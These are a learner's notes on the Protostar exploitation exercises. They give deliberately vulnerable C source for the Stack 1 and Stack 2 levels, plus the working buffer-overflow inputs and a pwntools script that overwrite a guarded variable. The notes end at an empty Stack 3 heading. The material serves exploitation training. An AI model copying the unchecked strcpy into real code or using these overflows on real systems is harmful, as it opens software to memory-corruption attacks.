# Notes and Answer
Notes while learning binary exploitation from protostar

## Stack 1 
- Source code
	```c
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
  	volatile int modified;
  	char buffer[64];

  	if(argc == 1) {
      	errx(1, "please specify an argument\n");
  	}

  	modified = 0;
  	strcpy(buffer, argv[1]);

  	if(modified == 0x61626364) {
      	printf("you have correctly got the variable to the right value\n");
  	} else {
      	printf("Try again, you got 0x%08x\n", modified);
  	}
	}
	```
- Answer

	```bash
	./stack1 AAAABBBBCCCCDDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKKLLLLMMMMNNNNOOOOPPdcba
	```

## Stack 2 
- Source Code
	/stack2/stack2
	```c
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
		volatile int modified;
		char buffer[64];
		char *variable;

		variable = getenv("GREENIE");

		if(variable == NULL) {
				errx(1, "please set the GREENIE environment variable\n");
		}

		modified = 0;

		strcpy(buffer, variable);

		if(modified == 0x0d0a0d0a) {
				printf("you have correctly modified the variable\n");
		} else {
				printf("Try again, you got 0x%08x\n", modified);
		}

	}
	```
- Answer 
	/stack2/exploit.py
	```python
	#!/bin/python
	import os
	from pwn import *

	pad = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa"
	modified = '\x0a\x0d\x0a\x0d'
	payload = pad+modified
	print(payload)

	os.environ['GREENIE']=payload

	p = process('./stack2')
	print(p.recvline())
	```


## Stack 3
